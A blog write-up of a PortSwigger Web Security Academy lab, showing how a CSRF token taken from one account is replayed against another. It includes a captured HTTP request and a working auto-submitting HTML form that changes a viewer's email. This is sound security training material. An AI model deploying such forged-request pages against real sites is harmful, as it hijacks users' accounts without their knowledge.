---
layout: post
title: "CSRF where the token is not tied to the user session"
date: 2026-10-13
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session){:target="_blank"}'s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You have two accounts on the application that you can use to help design your attack. The credentials are as follows:

- `wiener:peter`
- `carlos:montoya`

## Steps

Let's log in with `carlos`, assuming it is the attacker's account, and reset our email to get a CSRF token:

```http
POST /my-account/change-email HTTP/2
Host: 0aba003e04acb13f81a3f87c00530020.web-security-academy.net
Cookie: session=5hYkgsjBijNMQPUGbLMgSs6MIaDIdZHA
Content-Length: 63
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36
Origin: https://0aba003e04acb13f81a3f87c00530020.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aba003e04acb13f81a3f87c00530020.web-security-academy.net/my-account?id=carlos
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Sec-Gpc: 1
Priority: u=0, i

email=jawad%40example.com&csrf=fxkANyieAJOEDZJqgOXm4rwfYPYy9g0S
```

Let's take this CSRF value from `carlos` and use it on `wiener`:

```html
<h1>Lab04</h1>

<form method="POST" action="https://0aba003e04acb13f81a3f87c00530020.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="jawad-token-from-carlos@example.com">
  <input type="hidden" name="csrf" value="fxkANyieAJOEDZJqgOXm4rwfYPYy9g0S">
</form>

<script> document.forms[0].submit(); </script>
```

We can confirm that the CSRF token is not tied to the user session.
